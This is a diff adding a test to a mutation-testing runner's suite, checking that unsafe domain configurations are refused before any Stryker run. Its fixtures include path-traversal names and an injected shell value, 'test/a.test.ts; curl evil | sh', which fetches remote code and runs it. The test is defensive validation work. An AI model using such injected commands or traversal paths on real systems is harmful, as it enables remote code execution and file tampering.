@@ -78,4 +78,19 @@ describe("weekly mutation run: one Stryker run per domain (#1607)", () => {
       "reports/mutation/permissions-risk/stryker.config.json",
     );
   });
+
+  test("a domain name or file path that could leave its folder or reach the shell is refused before any run", () => {
+    const bad: MutationDomain[] = [
+      { ...domain("a"), name: "../../.github/workflows/x" },
+      { ...domain("a"), tests: ["test/a.test.ts; curl evil | sh"] },
+      { ...domain("a"), mutate: ["../outside.ts"] },
+    ];
+    for (const one of bad) {
+      const { deps, ran } = setup({});
+      expect(() => runWeekly({ ...deps, domains: [domain("ok"), one] }), one.name).toThrow(
+        /unsafe/,
+      );
+      expect(ran, "nothing runs when a later domain is unsafe").toEqual([]);
+    }
+  });
 });
